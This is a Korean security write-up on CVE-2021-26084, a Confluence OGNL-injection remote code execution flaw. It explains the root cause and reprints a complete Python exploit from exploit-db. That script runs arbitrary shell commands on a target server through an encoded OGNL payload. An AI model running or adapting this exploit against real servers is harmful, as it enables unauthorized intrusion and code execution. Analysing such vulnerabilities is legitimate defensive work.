# Atlassian Confluence 원격코드 실행 취약점

### Author

---

김순욱

### Date

---

2021.08.25

### Summary

---

국내외 다수 기업에서 사용하는 협업 플랫폼인 **Atlassian Confluence**에서 **원격코드 실행 취약점**(`CVE-2021–26084`)이 발견되었다. **OGNL 인젝션**을 통해 인증되지 않은 사용자가 Confluence 서버 및 데이터 센터에서 임의 코드를 실행(**RCE**)할 수 있는데, 공격 시도 시 사용자 인증과 같은 제약조건이 없어 취약점이 쉽게 스캐닝될 수 있었다.   Confluence 서버 및 Confluence Data Center 소프트웨어에 영향을 미치며, Atlassian에서는 취약점 패치와 함께 취약점 완화 스크립트를 제공했다. CVSS(v3) **9.8**점으로 발표되었다.

### Keywords

---

#CVE-2021–26084 #Atlassian #Confluence #Remote_Code_Execution_Vulnerability #OGNL_Injection

### Root Cause

---

**Confluence**는 Webwork 라이브러리를 사용하여 Velocity 템플릿에서 웹 페이지 콘텐츠를 동적으로 생성하기 위해 **[OGNL** 표현식](https://ko.wikipedia.org/wiki/OGNL)을 사용한다. Velocity 템플릿이 페이지에 렌더될 때 OGNL 구문이 해석되는데, 이때 사용자의 입력값의 유효성을 충분히 검사하지 않아 입력값이 템플릿에서 OGNL 구문으로 해석될 수 있다. 공격자는 이를 악용하여 Confluence 서버에 악의적인 **OGNL 구문을 삽입**하여 **임의 코드를 실행**할 수 있다.

Velocity 템플릿의 OGNL 표현식은 `ognl.OgnlParser.expression()` 메서드를 사용하는데, 입력 문자열을 기반으로 일련의 토큰으로 파싱한다.  OGNL 구문 분석기에서 호출하는 `ognl.JavaCharStream.readChar()` 메서드는 *“\uXXXX”* 형식을 유니코드 이스케이프 문자로 해석하며, 이때 *“XXXX”*는 유니코드 문자의 16진수 코드다. 따라서 식을 ***“\u0027”*** 문자로 포함하면 이는 **따옴표(’)**로 해석되어 문자열 리터럴로써 평가에서 벗어나 임의의 OGNL 식을 추가할 수 있다. 즉, OGNL 표현식이 단일 따옴표 쌍 내에 Velocity 템플릿에서 파싱되고 표현식의 값이 사용자 입력으로부터 얻어지면 임의의 OGNL 수식이 주입될 수 있다.

여기서 사용자 입력에 대한 충분한 **유효성 검사의 부족**으로 인해 **OGNL 인젝션** 취약점이 발생한다. *“\u0027”* 문자를 포함함으로써 공격자는 문자열 리터럴을 탈출하고 임의의 OGNL 식을 추가할 수 있게 되는 것이다.

또한 OGNL 표현식은 Webwork에 의해 평가되기 전에 `com.opensymphony.webwork.util.SafeExpressionUtil.containsUnsafeExpression()` 메서드에서 안전하지 않은 노드 유형, 속성 이름, 메서드 이름 및 변수 이름 리스트와 비교된다. 하지만 이 리스트가 완전하지 않으며, 나열된 요소를 사용하지 않고도 임의의 Java 개체를 인스턴스화 할 수 있다.

이를 이용해 원격 공격자는 악의적인 파라미터를 포함하는 조작된 HTTP 요청을 취약한 서버로 전송할 수 있고, 이 공격이 성공하면 서버의 권한으로 **임의 코드가 실행**(RCE)될 수 있다.

### Exploit

---

Atlassian 패치가 발표된 후, PoC 익스플로잇이 공개되면서 여러 공격자들이 이 취약점에 취약한 서버를 대상으로 암호화폐 채굴기를 설치하기 시작했다. 또한 랜섬웨어를 비롯한 다양한 사이버 공격에도 악용할 수 있어 미국 사이버 사령부(USCYBERCOM)에서는 이 취약점에 대해 즉시 패치하라고 경고하기도 했다. 

[exploit-db](https://www.exploit-db.com/exploits/50243)에서 파이썬으로 작성한 exploit 코드를 확인할 수 있는데, 다음과 같다.

```python
import requests
from bs4 import BeautifulSoup
import optparse

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target host: http://confluencexxx.com")
parser.add_option('-p', '--path', action="store", dest="path", help="Path to exploitation: /pages/createpage-entervariables.action?SpaceKey=x")

options, args = parser.parse_args()
session = requests.Session()

url_vuln = options.url
endpoint = options.path

if not options.url or not options.path:

    print('[+] Specify an url target')
    print('[+] Example usage: exploit.py -u http://xxxxx.com -p /pages/createpage-entervariables.action?SpaceKey=x')
    print('[+] Example help usage: exploit.py -h')
    exit()

def banner():

    print('---------------------------------------------------------------')
    print('[-] Confluence Server Webwork OGNL injection')
    print('[-] CVE-2021-26084')
    print('[-] https://github.com/h3v0x')
    print('--------------------------------------------------------------- \n')

def cmdExec():

    while True:
        cmd = input('> ')
        xpl_url = url_vuln + endpoint
        xpl_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded", "Accept-Encoding": "gzip, deflate"}
        xpl_data = {"queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022"+cmd+"\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}
        rawHTML = session.post(xpl_url, headers=xpl_headers, data=xpl_data)

        soup = BeautifulSoup(rawHTML.text, 'html.parser')
        queryStringValue = soup.find('input',attrs = {'name':'queryString', 'type':'hidden'})['value']
        print(queryStringValue)

banner()
cmdExec()
```

### References

---

[NVD - CVE-2021-26084](https://nvd.nist.gov/vuln/detail/CVE-2021-26084)

[Confluence Security Advisory - 2021-08-25 | Confluence Data Center 8.8 | Atlassian Documentation](https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html)

[atlassian](https://jira.atlassian.com/browse/CONFSERVER-67940)

[Zero Day Initiative — CVE-2021-26084: Details on the Recently Exploited Atlassian Confluence OGNL Injection Bug](https://www.zerodayinitiative.com/blog/2021/9/21/cve-2021-26084-details-on-the-recently-exploited-atlassian-confluence-ognl-injection-bug)

[2021 Hot🔥 보안 사건 사고 — 하반기](https://medium.com/theori-blog/2021-hot-cve-the-second-half-23eb5c45e35c)

[github](https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md)